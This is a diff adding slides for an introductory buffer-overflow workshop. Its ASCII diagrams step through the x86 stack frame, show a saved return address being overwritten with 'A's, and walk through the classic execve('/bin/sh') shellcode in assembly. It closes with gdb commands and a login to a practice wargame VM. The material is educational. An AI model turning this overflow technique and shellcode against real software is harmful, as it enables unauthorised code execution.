@@ -1,0 +1,930 @@
+# This is a sample Vroom input file. It should help you get started.
+#
+# Edit this file with your content. Then run `vroom --vroom` to start
+# the show!
+#
+# See `perldoc Vroom` for complete details.
+#
+---- config
+# Basic config options.
+title: buffer overflows
+indent: 5
+height: 18
+width: 69
+#auto_size: 1
+skip: 0
+
+---- center
+Buffer Overflow Workshop
+
+an Introduction
+---- c
+---- include bo.c
+----
+$cat /proc/$PID/maps
+---- include mappings.txt
+----
+ 0xffffe000->#------------------#
+             |                  |
+             |                  |
+             |       stack      |
+             |                  |
+             |                  |
+*0xfffdd000->|------------------|
+             |       ...        |
+ 0x0804a01c->|------------------|
+             |       bss        |
+ 0x0804a014->|------------------|
+             |       data       |
+ 0x0804a00c->|------------------|
+             |       ...        |
+ 0x080484da->|------------------|
+             |                  |
+             |       text       |
+             |                  |
+ 0x08048330->|------------------|
+             |       ...        |
+             #------------------#
+
+*stack-ende kann wachsen
+----
+== important registers
+
+* ebp: base pointer
+* esp: stack pointer
+* eip: instruction pointer
+----
+ 0xffffe000->#------------------#
+             |                  |
+             |                  |
+             |       stack      |
+             |                  |<-ebp
+             |                  |<-esp
+*0xfffdd000->|------------------|
+             |       ...        |
+ 0x0804a01c->|------------------|
+             |       bss        |
+ 0x0804a014->|------------------|
+             |       data       |
+ 0x0804a00c->|------------------|
+             |       ...        |
+ 0x080484da->|------------------|
+             |                  |
+             |       text       |<-eip
+             |                  |
+ 0x08048330->|------------------|
+             |       ...        |
+             #------------------#
+---- c
+---- include bo.c
+---- asm
+---- include main.s
+---- asm
+---- include foo.s
+---- asm
+0x08048440 <+28>:	call   0x8048404 <foo>
+	push %eip
+	jmp 0x8048404
+
+0x08048445 <+33>:	leave
+	mov %ebp,%esp
+	pop %ebp
+
+0x08048446 <+34>:	ret
+	pop %eip
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |
+            |                  |
+            |                  |<-ebp
+            |                  |
+            |                  |<-esp
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |
+            |main              |
+            | ...              |<-eip
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |
+            |                  |<-ebp
+            |                  |
+            |                  |
+            |     main_eip     |<-esp
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |
+            |main              |
+            | ...              |<-eip
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |
+            |                  |<-ebp
+            |                  |
+            |                  |
+            |     main_eip     |<-esp
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |<-eip
+            | ...              |
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |<-ebp
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-esp
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |<-eip
+            | ...              |
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |        3. mov    %esp,%ebp
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-esp <-ebp
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |<-eip
+            | ...              |
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |        3. mov    %esp,%ebp
+            |                  |        4. sub    $0x98,%esp
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-ebp
+            |        ^         |
+            |       buf        |
+            |        v         |<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |<-eip
+            | ...              |
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |        3. mov    %esp,%ebp
+            |                  |        4. sub    $0x98,%esp
+            |                  |        5. ???
+            |     main_eip     |
+            |     main_ebp     |<-ebp
+            |        ^         |
+            |       buf        |
+            |        v         |
+            |                  |<-esp
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |        3. mov    %esp,%ebp
+            |                  |        4. sub    $0x98,%esp
+            |                  |        5. ???
+            |     main_eip     |        6. leave
+            |     main_ebp     |<-ebp <-esp
+            |        ^         |
+            |       buf        |
+            |        v         |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |<-ebp   3. mov    %esp,%ebp
+            |                  |        4. sub    $0x98,%esp
+            |                  |        5. ???
+            |     main_eip     |<-esp   6. leave
+            |     main_ebp     |
+            |        ^         |
+            |       buf        |
+            |        v         |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |<-ebp   3. mov    %esp,%ebp
+            |                  |        4. sub    $0x98,%esp
+            |                  |<-esp   5. ???
+            |     main_eip     |        6. leave
+            |     main_ebp     |        7. ret
+            |        ^         |
+            |       buf        |
+            |        v         |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. call   0x8048404 <foo>
+            |                  |        2. push   %ebp
+            |                  |<-ebp   3. mov    %esp,%ebp
+            |                  |        4. sub    $0x98,%esp
+            |                  |<-esp   5. ???
+            |     main_eip     |        6. leave
+            |     main_ebp     |        7. ret
+            |        ^         |
+            |       buf        |
+            |        v         |
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |
+            |main              |
+            | ...              |<-eip
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+---- center
+Again with a buffer overflow
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-ebp
+            |        ^         |
+            |       buf        |
+            |        v         |<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-ebp
+            |        ^         |
+            |       buf        |
+            |        v     AAAA|<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-ebp
+            |        ^         |
+            |       buf    AAAA|
+            |        v     AAAA|<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp     |<-ebp
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip     |
+            |     main_ebp AAAA|<-ebp
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip AAAA|
+            |     main_ebp AAAA|<-ebp
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|<-esp
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |        2. ???
+            |                  |
+            |                  |
+            |                  |
+            |     main_eip AAAA|
+            |     main_ebp AAAA|<-ebp
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|
+            |                  |<-esp
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |        2. ???
+            |                  |        3. leave
+            |                  |
+            |                  |
+            |     main_eip AAAA|
+            |     main_ebp AAAA|<-ebp <-esp
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+            |       ...        |
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |        2. ???
+            |                  |        3. leave
+            |                  |
+            |                  |
+            |     main_eip AAAA|<-esp
+            |     main_ebp AAAA|
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+0x41414141->|       ...        |<-ebp
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |<-eip
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+----
+0xffffe000->#------------------#
+            |                  |
+            |       stack      |        1. buffer overflow (with As)
+            |                  |        2. ???
+            |                  |        3. leave
+            |                  |        4. ret
+            |                  |<-esp
+            |     main_eip AAAA|
+            |     main_ebp AAAA|
+            |        ^     AAAA|
+            |       buf    AAAA|
+            |        v     AAAA|
+            |                  |
+0xfffdd000->|------------------|
+            |                  |
+0x41414141->|       ...        |<-ebp <-eip
+            |                  |
+0x080484da->|------------------|
+            |foo               |
+            | ...              |
+            |main              |
+            | ...              |
+0x08048330->|------------------|
+            |       ...        |
+            #------------------#
+---- center
+Whats left?
+
++shellcode
+---- c
+#include <stdlib.h>
+int main()
+{
+	const char *s[2] = {"/bin/sh", NULL };
+	execve(s[0], s, NULL);
+	return 0;
+}
+---- asm
+Dump of assembler code for function execve:
+<+0>:	push   %ebp
+<+1>:	mov    %esp,%ebp
+<+3>:	push   %ebx
+<+4>:	mov    0x10(%ebp),%edx
+<+7>:	mov    0xc(%ebp),%ecx
+<+10>:	mov    0x8(%ebp),%ebx
+<+13>:	mov    $0xb,%eax
+<+18>:	call   *0x80d0098
+<+24>:	cmp    $0xfffff000,%eax
+<+29>:	ja     0x8052f92 <execve+34>
+<+31>:	pop    %ebx
+<+32>:	leave  
+<+33>:	ret    
+<+34>:	neg    %eax
+<+36>:	mov    $0xffffffe8,%edx
+<+42>:	mov    %eax,%gs:(%edx)
+<+45>:	or     $0xffffffff,%eax
+<+48>:	jmp    0x8052f8f <execve+31>
+---- asm
+eip->jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx
+     movl   %ebx,%eax
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx
+     movl   %ebx,%eax
+     inc    %eax
+     int    $0x80
+eip->call   -0x24
+     .string "/bin/sh"
+---- asm
+     jmp    0x1f
+eip->popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |  &.string  |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx
+     movl   %ebx,%eax
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+eip->movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+eip->xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh"
+     &.string
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+eip->movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 0
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh"
+     &.string
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+eip->movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 0
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh\0"
+     &.string
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+eip->movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 0
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh\0"
+     &.string
+     "\0\0\0\0"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+eip->movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 11
+     inc    %eax
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh\0"
+     &.string
+     "\0\0\0\0"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+eip->leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 11
+     inc    %eax             %ebx: &.string
+     int    $0x80
+     call   -0x24
+     .string "/bin/sh\0"
+     &.string
+     "\0\0\0\0"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+eip->leal   0xc(%esi),%edx   #------------#
+     int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 11
+     inc    %eax             %ebx: &.string
+     int    $0x80            %ecx: &(&.string)
+     call   -0x24
+     .string "/bin/sh\0"
+     &.string
+     "\0\0\0\0"
+---- asm
+     jmp    0x1f
+     popl   %esi             #------------#
+     movl   %esi,0x8(%esi)   |            |
+     xorl   %eax,%eax        |            |
+     movb   %eax,0x7(%esi)   |            |
+     movl   %eax,0xc(%esi)   |            |
+     movb   $0xb,%al         |            |
+     movl   %esi,%ebx        |            |
+     leal   0x8(%esi),%ecx   |            |
+     leal   0xc(%esi),%edx   #------------#
+eip->int    $0x80
+     xorl   %ebx,%ebx        %esi: &.string
+     movl   %ebx,%eax        %eax: 11
+     inc    %eax             %ebx: &.string
+     int    $0x80            %ecx: &(&.string)
+     call   -0x24            %edx: &"\0\0\0\0"
+     .string "/bin/sh\0"
+     &.string
+     "\0\0\0\0"
+----
+== useful gdb commands
+
+break <function_name>
+break *<address>
+break <line_no>
+
++run <args>
++continue
++next
++step
+
++backtrace
++info frame
++info registers
++print $<register>
+print <variable>
++x/<number><char> <address>
+	<char> zB i: instructions
+	          x: hex
+             s: string
+---- center
+== Try it!
+
+ssh level1@wargame-vm.local
+password: level1
+
